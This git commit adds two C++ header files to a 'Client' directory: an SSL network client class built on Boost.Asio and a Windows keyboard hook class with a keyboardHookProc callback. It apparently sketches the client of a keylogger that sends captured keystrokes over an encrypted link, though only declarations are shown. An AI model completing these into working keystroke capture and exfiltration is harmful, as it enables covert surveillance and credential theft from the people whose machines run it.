6cbbc37147d06c4dbacf743a5f7abe4b8bbf1e75
Bluephoenix <biendien4508@gmail.com>
2024-04-01 15:44:04 +0700

    thêm 1 vài file header

---
+++ Client/BoostNetwork.h
@@ -0,0 +1,50 @@
+#ifndef BOOSTNETWORK_H_
+#define BOOSTNETWORK_H_
+#include <string>
+#include <thread>
+#include <chrono>
+#include <boost/asio.hpp>
+#include <boost/asio/ssl.hpp>
+#include <boost/bind/bind.hpp>
+class BoostNetwork
+{
+public:
+    // Constructor with default host and port
+    BoostNetwork(boost::asio::io_service &io_service, boost::asio::ssl::context &context);
+
+    // Constructor with specified host and port
+    BoostNetwork(const std::string &port, const std::string &host, boost::asio::io_service &io_service, boost::asio::ssl::context &context);
+
+    // Send data
+    int send(const std::vector<char> &msg);
+
+    // Reset connection
+    void resetConnection();
+
+    // Receive data
+    int receive();
+
+    // Handle handshake
+    void handle_handshake(const boost::system::error_code &error);
+
+    // Handle connection
+    void handle_connect(const boost::system::error_code &error);
+
+    // Attempt connection
+    void tryConnection();
+
+    // Disconnect
+    bool disconnect();
+
+    // Run IO service
+    void run();
+
+private:
+    std::string _port;
+    std::string _host;
+    boost::asio::io_service &_io_service;
+    std::unique_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> _client;
+    bool _isConnected;
+};
+
+#endif // BOOSTNETWORK_H_
---
+++ Client/KbHooker.hpp
@@ -0,0 +1,18 @@
+
+#ifndef KBHOOKER_HPP_
+#define KBHOOKER_HPP_
+
+#include "ADataHoorker.hpp"
+
+class KbHooker : public ADataHooker
+{
+public:
+    KbHooker();
+    ~KbHooker() = default;
+
+    void startHook();
+    void stopHook();
+    static LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
+};
+
+#endif // !KBHOOKER_HPP_
